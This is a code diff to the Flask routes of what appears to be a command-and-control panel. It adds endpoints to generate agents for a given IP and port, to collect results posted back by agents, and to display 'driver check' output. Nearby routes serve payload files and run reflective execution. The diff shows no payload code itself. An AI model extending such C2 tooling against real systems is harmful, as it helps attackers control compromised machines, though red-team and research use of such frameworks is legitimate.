@@ -6,6 +6,7 @@ from apps import db
 from apps.home.db import allAgents, operationResults
 from C2Server.server import *
 from apps.exploit.operation import *
+from apps.agent.script import *
 import os
 import socket
 # from exploit import attacker
@@ -82,6 +83,17 @@ def delete_payload():
                 window.location.href = document.referrer;
             </script>"""
 
+@blueprint.route("/generate_agent", methods=['POST'])
+def generate_agent():
+    arg = request.form.to_dict()
+    ipAddr = arg['ipAddr']
+    port = int(arg['port'])
+    script_generate_agent(ipAddr, port)
+    return """
+            <script>
+                window.alert("Compile Success");
+                window.location.href = document.referrer;
+            </script>"""
 
 @blueprint.route('/exploit/<filename>', methods=["GET"]) # endpoint for retrieving payload files 
 def return_exploit(filename):
@@ -202,8 +214,22 @@ def execute_reflective():
             window.location.href = document.referrer;
         </script>"""
 
+
+@blueprint.route("/driver_results", methods=["POST"])
+def driver_results():
+    global result_data
+    data = request.get_json()
+
+    if 'result' in data:
+        result_data = data['result']
+        print(f"Received result data:\n{result_data}")
+
+    return '', 204  # 204 No Content response
+
 @blueprint.route("/execute_driver", methods=["POST"])
 def execute_driver():
+    global result_data
+
     arg = request.form.to_dict()
     if arg != {}:
         agent = arg['selected_driver_agent']
@@ -215,11 +241,13 @@ def execute_driver():
                     for conn in connections:
                         if conn[6] == client_id:
                             driverCheck(conn)
-                            return """
-                                <script>
-                                    window.alert("Driver Check Executed");
-                                    window.location.href = document.referrer;
-                                </script>"""
+                            # result_message = f'window.alert("Driver Check Executed successfully.\\n\\n{result_data}");'
+                            return render_template('home/operations.html', result_data=result_data, show_results=True)
+                            # return f"""
+                            #     <script>
+                            #         {result_message}
+                            #         window.location.href = document.referrer;
+                            #     </script>"""
                         else:
                             return """
                                 <script>
